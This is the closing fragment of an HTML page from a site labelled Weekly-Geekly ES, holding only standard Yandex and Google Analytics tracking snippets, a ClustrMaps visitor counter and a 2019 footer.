<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>